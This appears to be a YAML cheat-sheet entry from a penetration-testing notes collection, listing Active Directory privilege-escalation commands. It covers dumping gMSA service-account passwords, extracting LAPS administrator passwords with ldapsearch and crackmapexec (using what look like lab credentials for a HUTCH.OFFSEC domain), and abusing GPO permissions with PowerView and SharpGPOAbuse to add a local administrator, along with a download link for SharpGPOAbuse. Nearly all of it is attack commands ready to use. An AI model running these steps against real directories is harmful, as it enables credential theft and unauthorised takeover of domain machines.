---
functions:
  privilege-escalation:
    - description: Extract a stored Service Account Password
      code: |
        Import-Module ActiveDirectory
        Get-ADServiceAccount -Filter * [-Properties *]
        $gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
        $mp = $gmsa.'msDS-ManagedPassword'
        Can you Read $mp?
        ./GMSAPasswordReader.exe --accountname svc_apache  #rc4_hmac --> nthash

    - description: Extract Account Passwords from Local Administrator Password Solution (LAPS)
      code: |
        wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /V "Windows"
        --> Local Administrator Password Solution                  Microsoft Corporation  6.2.0.0
        
        ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.165.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
        crackmapexec ldap 192.168.165.122 -u fmcsorley -p CrabSharkJellyfish192 –kdcHost 192.168.165.122 -M laps

        Import-Module ActiveDirectory
        Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'

    - description: Abuse GPO permissions
      code: |
        . ./PowerView.ps1
        $n=get-netgpo;$n.name | ForEach { Write-Host "$_"; Get-GPPermission -Guid $_ -all }     #find username
        $n=get-gpo -all;$n.Id | ForEach { Write-Host "$_"; Get-GPPermission -Guid $_ -all }     #find username
            --> 31b2f340-016d-11d2-945f-00c04fb984f9 --> username and edit perms

        get-gpo -guid 31b2f340-016d-11d2-945f-00c04fb984f9
        ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"


resources : |
    https://adsecurity.org/?p=3658
    https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
---

